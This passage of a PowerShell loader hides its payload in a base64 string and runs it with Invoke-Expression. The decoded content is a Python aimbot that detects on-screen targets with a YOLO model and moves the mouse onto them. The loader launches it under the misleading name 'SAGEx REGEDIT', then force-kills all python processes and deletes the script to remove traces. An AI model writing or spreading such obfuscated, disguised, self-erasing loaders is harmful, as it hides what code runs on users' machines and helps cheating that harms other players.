KICAgICAgICByZW1haW5pbmdfeSA9IHRhcmdldF95IC0gcHlhdXRvZ3VpLnBvc2l0aW9uKClbMV0NCiAgICAgICAgaWYgYWJzKHJlbWFpbmluZ194KSA+IDAgb3IgYWJzKHJlbWFpbmluZ195KSA+IDA6DQogICAgICAgICAgICB3aW4zMmFwaS5tb3VzZV9ldmVudCgweDAwMDEsIGludChyZW1haW5pbmdfeCksIGludChyZW1haW5pbmdfeSksIDAsIDApDQogICAgICAgIA0KICAgICAgICByZXR1cm4gKHRpbWUucGVyZl9jb3VudGVyKCkgLSBzdGFydF90aW1lKSAqIDEwMDANCiAgICANCiAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6DQogICAgICAgIGxvZ2dpbmcuZXJyb3IoZiJBaW1pbmcgZXJyb3I6IHtzdHIoZSl9IikNCiAgICAgICAgcmV0dXJuIDANCg0KIyA9PT09PT09PT09PT09PT09IFJFQUwtVElNRSBQUk9DRVNTSU5HID09PT09PT09PT09PT09PT0NCmRlZiBwcm9jZXNzX2FpbWJvdChjb25maWcsIG1vZGVsLCBzY3QsIHdpbmRvdyk6DQogICAgZnBzX2NvdW50ZXIgPSAwDQogICAgbGFzdF9mcHNfdGltZSA9IHRpbWUudGltZSgpDQogICAgDQogICAgd2hpbGUgVHJ1ZToNCiAgICAgICAgc3RhcnRfdGltZSA9IHRpbWUucGVyZl9jb3VudGVyKCkNCiAgICAgICAgDQogICAgICAgICMgUHJvY2VzcyBHVUkgZXZlbnRzIChub24tYmxvY2tpbmcpDQogICAgICAgIGV2ZW50LCB2YWx1ZXMgPSB3aW5kb3cucmVhZCh0aW1lb3V0PTApDQogICAgICAgIGlmIGV2ZW50IGluIChzZy5XSU5fQ0xPU0VELCAnLUVYSVQtJykgb3Igd2luMzJhcGkuR2V0QXN5bmNLZXlTdGF0ZSh3aW4zMmNvbi5WS19GOCkgJiAweDgwMDA6DQogICAgICAgICAgICBicmVhaw0KICAgICAgICANCiAgICAgICAgIyBUb2dnbGUgYWltYm90DQogICAgICAgIGlmIChldmVudCA9PSAnLVRPR0dMRS0nIG9yIHdpbjMyYXBpLkdldEFzeW5jS2V5U3RhdGUod2luMzJjb24uVktfRjYpICYgMHg4MDAwKToNCiAgICAgICAgICAgIHdpdGggY29uZmlnLmxvY2s6DQogICAgICAgICAgICAgICAgY29uZmlnLmFjdGl2ZSA9IG5vdCBjb25maWcuYWN0aXZlDQogICAgICAgICAgICAgICAgY29uZmlnLnN0YXR1cyA9ICJBQ1RJVkUiIGlmIGNvbmZpZy5hY3RpdmUgZWxzZSAiSU5BQ1RJVkUiDQogICAgICAgICAgICAgICAgaWYgY29uZmlnLmVuYWJsZV9zb3VuZDoNCiAgICAgICAgICAgICAgICAgICAgd2luc291bmQuQmVlcCgxMjAwIGlmIGNvbmZpZy5hY3RpdmUgZWxzZSA5MDAsIDgwKQ0KICAgICAgICANCiAgICAgICAgIyBVcGRhdGUgY29uZmlnDQogICAgICAgIHdpdGggY29uZmlnLmxvY2s6DQogICAgICAgICAgICBjb25maWcuY29uZmlkZW5jZSA9IGZsb2F0KHZhbHVlc1snLUNPTkZJREVOQ0UtJ10pDQogICAgICAgICAgICBjb25maWcuc21vb3RobmVzcyA9IGZsb2F0KHZhbHVlc1snLVNNT09USE5FU1MtJ10pDQogICAgICAgICAgICBpZiBjb25maWcucmVnaW9uX3NpemUgIT0gaW50KHZhbHVlc1snLVJFR0lPTi0nXSk6DQogICAgICAgICAgICAgICAgY29uZmlnLnJlZ2lvbl9zaXplID0gaW50KHZhbHVlc1snLVJFR0lPTi0nXSkNCiAgICAgICAgICAgICAgICBjb25maWcudXBkYXRlX3NjcmVlbl9wYXJhbXMoKQ0KICAgICAgICAgICAgY29uZmlnLmVuYWJsZV9zb3VuZCA9IGJvb2wodmFsdWVzWyctU09VTkQtJ10pDQogICAgICAgIA0KICAgICAgICAjIERldGVjdGlvbiBhbmQgYWltaW5nDQogICAgICAgIGxhdGVuY3kgPSAwDQogICAgICAgIGlmIGNvbmZpZy5hY3RpdmUgYW5kIHdpbjMyYXBpLkdldEFzeW5jS2V5U3RhdGUod2luMzJjb24uVktfTEJVVFRPTikgJiAweDgwMDA6DQogICAgICAgICAgICB0YXJnZXRzLCBkZXRlY3Rpb25faW1nID0gZGV0ZWN0X3RhcmdldHMoY29uZmlnLCBtb2RlbCwgc2N0KQ0KICAgICAgICAgICAgDQogICAgICAgICAgICB3aXRoIGNvbmZpZy5sb2NrOg0KICAgICAgICAgICAgICAgIGNvbmZpZy50YXJnZXRfY291bnQgPSBsZW4odGFyZ2V0cykNCiAgICAgICAgICAgICAgICBjb25maWcuZGV0ZWN0aW9uX3N0YXR1cyA9ICJBQ1RJVkUiIGlmIHRhcmdldHMgZWxzZSAiU0NBTk5JTkciDQogICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgaWYgdGFyZ2V0czoNCiAgICAgICAgICAgICAgICAgICAgYmVzdF90YXJnZXQgPSBtYXgodGFyZ2V0cywga2V5PWxhbWJkYSB4OiB4Wydjb25maWRlbmNlJ10pDQogICAgICAgICAgICAgICAgICAgIGxhdGVuY3kgPSBwcmVjaXNpb25fYWltKGNvbmZpZywgYmVzdF90YXJnZXRbJ3gnXSwgYmVzdF90YXJnZXRbJ3knXSkNCiAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICAjIFVwZGF0ZSBwcmV2aWV3IGltYWdlIGlmIGF2YWlsYWJsZQ0KICAgICAgICAgICAgICAgIGlmIGRldGVjdGlvbl9pbWcgaXMgbm90IE5vbmUgYW5kIHRpbWUudGltZSgpIC0gY29uZmlnLmxhc3RfdWlfdXBkYXRlID4gSFZfQ09ORklHWyJ1aV91cGRhdGVfaW50ZXJ2YWwiXToNCiAgICAgICAgICAgICAgICAgICAgcHJldmlldyA9IGN2Mi5yZXNpemUoZGV0ZWN0aW9uX2ltZywgKDIwMCwgMTAwKSkNCiAgICAgICAgICAgICAgICAgICAgY3YyLmRyYXdNYXJrZXIocHJldmlldywgKDEwMCwgNTApLCAoMCwgMjU1LCAwKSwgDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgbWFya2VyVHlwZT1jdjIuTUFSS0VSX0NST1NTLCBtYXJrZXJTaXplPTIwLCB0aGlja25lc3M9MSkNCiAgICAgICAgICAgICAgICAgICAgaW1nX2J5dGVzID0gY3YyLmltZW5jb2RlKCcucG5nJywgcHJldmlldylbMV0udG9ieXRlcygpDQogICAgICAgICAgICAgICAgICAgIHdpbmRvd1snLVBSRVZJRVctJ10udXBkYXRlKGRhdGE9aW1nX2J5dGVzKQ0KICAgICAgICAgICAgICAgICAgICBjb25maWcubGFzdF91aV91cGRhdGUgPSB0aW1lLnRpbWUoKQ0KICAgICAgICANCiAgICAgICAgIyBQZXJmb3JtYW5jZSBtZXRyaWNzDQogICAgICAgIGZwc19jb3VudGVyICs9IDENCiAgICAgICAgaWYgdGltZS50aW1lKCkgLSBsYXN0X2Zwc190aW1lID49IDAuNTogICMgVXBkYXRlIEZQUyB0d2ljZSBwZXIgc2Vjb25kIGZvciBzbW9vdGhlciBkaXNwbGF5DQogICAgICAgICAgICB3aXRoIGNvbmZpZy5sb2NrOg0KICAgICAgICAgICAgICAgIGNvbmZpZy5jdXJyZW50X2ZwcyA9IGZwc19jb3VudGVyIC8gKHRpbWUudGltZSgpIC0gbGFzdF9mcHNfdGltZSkNCiAgICAgICAgICAgICAgICBjb25maWcuY3VycmVudF9sYXRlbmN5ID0gbGF0ZW5jeSBpZiBsYXRlbmN5ID4gMCBlbHNlIGNvbmZpZy5jdXJyZW50X2xhdGVuY3kgKiAwLjkNCiAgICAgICAgICAgIGZwc19jb3VudGVyID0gMA0KICAgICAgICAgICAgbGFzdF9mcHNfdGltZSA9IHRpbWUudGltZSgpDQogICAgICAgIA0KICAgICAgICAjIFVJIHVwZGF0ZXMNCiAgICAgICAgaWYgdGltZS50aW1lKCkgLSBjb25maWcubGFzdF91aV91cGRhdGUgPiBIVl9DT05GSUdbInVpX3VwZGF0ZV9pbnRlcnZhbCJdOg0KICAgICAgICAgICAgd2l0aCBjb25maWcubG9jazoNCiAgICAgICAgICAgICAgICB3aW5kb3dbJy1TVEFUVVMtJ10udXBkYXRlKA0KICAgICAgICAgICAgICAgICAgICBjb25maWcuc3RhdHVzLCANCiAgICAgICAgICAgICAgICAgICAgdGV4dF9jb2xvcj0nbGltZScgaWYgY29uZmlnLnN0YXR1cyA9PSAiQUNUSVZFIiBlbHNlICdyZWQnKQ0KICAgICAgICAgICAgICAgIHdpbmRvd1snLURFVEVDVElPTi0nXS51cGRhdGUoDQogICAgICAgICAgICAgICAgICAgIGNvbmZpZy5kZXRlY3Rpb25fc3RhdHVzLA0KICAgICAgICAgICAgICAgICAgICB0ZXh0X2NvbG9yPSdsaW1lJyBpZiBjb25maWcuZGV0ZWN0aW9uX3N0YXR1cyA9PSAiQUNUSVZFIiBlbHNlICd5ZWxsb3cnKQ0KICAgICAgICAgICAgICAgIHdpbmRvd1snLUZQUy0nXS51cGRhdGUoZiJ7Y29uZmlnLmN1cnJlbnRfZnBzOi4wZn0iKQ0KICAgICAgICAgICAgICAgIHdpbmRvd1snLUxBVEVOQ1ktJ10udXBkYXRlKGYie2NvbmZpZy5jdXJyZW50X2xhdGVuY3k6LjFmfW1zIikNCiAgICAgICAgICAgICAgICB3aW5kb3dbJy1UQVJHRVRTLSddLnVwZGF0ZShmIntjb25maWcudGFyZ2V0X2NvdW50fSIpDQogICAgICAgICAgICAgICAgY29uZmlnLmxhc3RfdWlfdXBkYXRlID0gdGltZS50aW1lKCkNCiAgICAgICAgDQogICAgICAgICMgUHJlY2lzaW9uIHNsZWVwIGZvciBjb25zaXN0ZW50IEZQUw0KICAgICAgICBlbGFwc2VkID0gdGltZS5wZXJmX2NvdW50ZXIoKSAtIHN0YXJ0X3RpbWUNCiAgICAgICAgc2xlZXBfdGltZSA9IG1heCgwLCAoMS9IVl9DT05GSUdbInRhcmdldF9mcHMiXSkgLSBlbGFwc2VkKQ0KICAgICAgICBpZiBzbGVlcF90aW1lID4gMDoNCiAgICAgICAgICAgIHRpbWUuc2xlZXAoc2xlZXBfdGltZSkNCg0KZGVmIG1haW4oKToNCiAgICB3aW5kb3cgPSBOb25lDQogICAgdHJ5Og0KICAgICAgICAjIEluaXRpYWxpemUNCiAgICAgICAgY29uZmlnID0gQWltYm90Q29uZmlnKCkNCiAgICAgICAgbW9kZWwgPSBZT0xPKCJ5b2xvdjhuLnB0IikNCiAgICAgICAgd2luZG93ID0gY3JlYXRlX2d1aSgpDQogICAgICAgIHNjdCA9IG1zcy5tc3MoKQ0KICAgICAgICANCiAgICAgICAgIyBTdGFydCBwcm9jZXNzaW5nDQogICAgICAgIHByb2Nlc3NfYWltYm90KGNvbmZpZywgbW9kZWwsIHNjdCwgd2luZG93KQ0KICAgICAgICANCiAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6DQogICAgICAgIGxvZ2dpbmcuY3JpdGljYWwoZiJGYXRhbCBlcnJvcjoge3N0cihlKX0iKQ0KICAgICAgICBpZiB3aW5kb3c6DQogICAgICAgICAgICB3aW5kb3cuY2xvc2UoKQ0KICAgICAgICByYWlzZQ0KDQppZiBfX25hbWVfXyA9PSAiX19tYWluX18iOg0KICAgIG1haW4oKQ0KJ0AgfCBPdXQtRmlsZSAtRmlsZVBhdGggJHRlbXBQeSAtRW5jb2RpbmcgdXRmOCAtRm9yY2UNCn0NCg0KdHJ5IHsNCiAgICBTaG93LUNvbnNvbGUNCiAgICANCiAgICBpZiAoLW5vdCAoVGVzdC1BZG1pbikpIHsNCiAgICAgICAgV3JpdGUtSG9zdCAiWyFdIFdhcm5pbmc6IFJ1bm5pbmcgd2l0aG91dCBhZG1pbiBwcml2aWxlZ2VzIiAtRm9yZWdyb3VuZENvbG9yIFllbGxvdw0KICAgIH0NCiAgICANCiAgICBXcml0ZS1Ib3N0ICJbK10gQ2hlY2tpbmcgUHl0aG9uLi4uIiAtRm9yZWdyb3VuZENvbG9yIEN5YW4NCiAgICB0cnkgew0KICAgICAgICAkcHl0aG9uVmVyc2lvbiA9ICgmIHB5dGhvbiAtLXZlcnNpb24gMj4mMSB8IE91dC1TdHJpbmcpLlRyaW0oKQ0KICAgICAgICBpZiAoLW5vdCAkcHl0aG9uVmVyc2lvbiAtb3IgJHB5dGhvblZlcnNpb24gLW1hdGNoICJub3QgZm91bmQiKSB7DQogICAgICAgICAgICB0aHJvdyAiUHl0aG9uIG5vdCBmb3VuZCINCiAgICAgICAgfQ0KICAgICAgICBXcml0ZS1Ib3N0ICIgIC0gRm91bmQgJHB5dGhvblZlcnNpb24iIC1Gb3JlZ3JvdW5kQ29sb3IgR3JlZW4NCiAgICB9DQogICAgY2F0Y2ggew0KICAgICAgICBXcml0ZS1Ib3N0ICJbLV0gUHl0aG9uIGlzIHJlcXVpcmVkLiBJbnN0YWxsIGZyb20gaHR0cHM6Ly93d3cucHl0aG9uLm9yZy8iIC1Gb3JlZ3JvdW5kQ29sb3IgUmVkDQogICAgICAgIHBhdXNlDQogICAgICAgIGV4aXQgMQ0KICAgIH0NCiAgICANCiAgICBJbnN0YWxsLVBhY2thZ2VzDQogICAgDQogICAgaWYgKC1ub3QgKFRlc3QtTW9kZWwpKSB7DQogICAgICAgIFdyaXRlLUhvc3QgIlshXSBNb2RlbCBub3QgZm91bmQgb3IgaW52YWxpZC4gRG93bmxvYWRpbmcuLi4iIC1Gb3JlZ3JvdW5kQ29sb3IgWWVsbG93DQogICAgICAgIGlmICgtbm90IChHZXQtTW9kZWwpKSB7DQogICAgICAgICAgICBXcml0ZS1Ib3N0ICJbLV0gRmFpbGVkIHRvIGluaXRpYWxpemUgbW9kZWwuIEV4aXRpbmcuLi4iIC1Gb3JlZ3JvdW5kQ29sb3IgUmVkDQogICAgICAgICAgICBwYXVzZQ0KICAgICAgICAgICAgZXhpdCAxDQogICAgICAgIH0NCiAgICB9DQogICAgV3JpdGUtSG9zdCAiWytdIE1vZGVsIHZlcmlmaWVkIHN1Y2Nlc3NmdWxseSEiIC1Gb3JlZ3JvdW5kQ29sb3IgR3JlZW4NCiAgICANCiAgICBDcmVhdGUtUHl0aG9uU2NyaXB0DQogICAgDQogICAgV3JpdGUtSG9zdCAiWytdIExhdW5jaGluZyBTQUdFeCBSRUdFRElUIFY0LjItSHlwZXJWaWdpbGFudCBFZGl0aW9uLi4uIiAtRm9yZWdyb3VuZENvbG9yIEdyZWVuDQogICAgJiBweXRob24gJHRlbXBQeQ0KICAgIA0KICAgIFdyaXRlLUhvc3QgIlsrXSBTY3JpcHQgY29tcGxldGVkIHN1Y2Nlc3NmdWxseSIgLUZvcmVncm91bmRDb2xvciBHcmVlbg0KfQ0KY2F0Y2ggew0KICAgIFdyaXRlLUhvc3QgIlstXSBFUlJPUjogJF8iIC1Gb3JlZ3JvdW5kQ29sb3IgUmVkDQogICAgV3JpdGUtSG9zdCAiWy1dIFN0YWNrIFRyYWNlOiAkKCRfLlNjcmlwdFN0YWNrVHJhY2UpIiAtRm9yZWdyb3VuZENvbG9yIERhcmtSZWQNCiAgICBwYXVzZQ0KfQ0KZmluYWxseSB7DQogICAgV3JpdGUtSG9zdCAiWytdIENsZWFuaW5nIHVwLi4uIiAtRm9yZWdyb3VuZENvbG9yIEN5YW4NCiAgICBmdW5jdGlvbiBGb3JjZS1SZW1vdmVTQUdFeEZpbGVzIHsNCiAgICAgICAgJGFwcERhdGFGb2xkZXIgPSAiJGVudjpBUFBEQVRBXFNBR0V4IFJFR0VESVQiDQogICAgICAgICRweXRob25TY3JpcHQgPSAiJGFwcERhdGFGb2xkZXJcU0FHRXggUkVHRURJVC5weSINCg0KICAgICAgICBpZiAoVGVzdC1QYXRoICRweXRob25TY3JpcHQpIHsNCiAgICAgICAgICAgIHRyeSB7DQogICAgICAgICAgICAgICAgR2V0LVByb2Nlc3MgcHl0aG9uIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlIHwgU3RvcC1Qcm9jZXNzIC1Gb3JjZQ0KICAgICAgICAgICAgICAgIFJlbW92ZS1JdGVtIC1QYXRoICRweXRob25TY3JpcHQgLUZvcmNlIC1FcnJvckFjdGlvbiBTdG9wDQogICAgICAgICAgICAgICAgV3JpdGUtSG9zdCAiWytdIFN1Y2Nlc3NmdWxseSBkZWxldGVkIFNBR0V4IFJFR0VESVQucHkiIC1Gb3JlZ3JvdW5kQ29sb3IgR3JlZW4NCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIGNhdGNoIHsNCiAgICAgICAgICAgICAgICBXcml0ZS1Ib3N0ICJbIV0gRmFpbGVkIHRvIGRlbGV0ZSBTQUdFeCBSRUdFRElULnB5OiAkXyIgLUZvcmVncm91bmRDb2xvciBSZWQNCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KICAgIH0NCiAgICBGb3JjZS1SZW1vdmVTQUdFeEZpbGVzDQp9';
$decoded = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($payload));
Invoke-Expression $decoded;
